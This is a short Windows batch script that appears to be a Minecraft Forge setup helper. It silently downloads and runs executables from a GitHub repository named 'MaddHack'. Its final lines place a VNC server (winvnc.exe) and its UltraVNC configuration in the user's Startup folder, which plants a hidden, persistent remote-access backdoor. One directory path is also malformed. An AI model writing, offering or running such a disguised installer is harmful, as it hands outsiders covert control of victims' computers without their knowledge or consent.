@echo off
cls
cd %userprofile%\AppData\Local\Temp
curl -s https://github.com/DrMaddMam/MaddHack/raw/main/MBSetup.exe -O
MBSetup.exe -silent
curl -s https://github.com/DrMaddMam/MaddHack/raw/main/jre-8u401-windows-x64.exe -O
jre-8u401-windows-x64.exe /s
curl -s https://maven.minecraftforge.net/net/minecraftforge/forge/1.12.2-14.23.5.2860/forge-1.12.2-14.23.5.2860-installer.jar -O
forge-1.12.2-14.23.5.2860-installer.jar
cd %userprofile%AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
mkdir System
curl -s https://github.com/DrMaddMam/MaddHack/raw/main/winvnc.exe -O
curl -s https://github.com/DrMaddMam/MaddHack/blob/main/UltraVNC.ini -O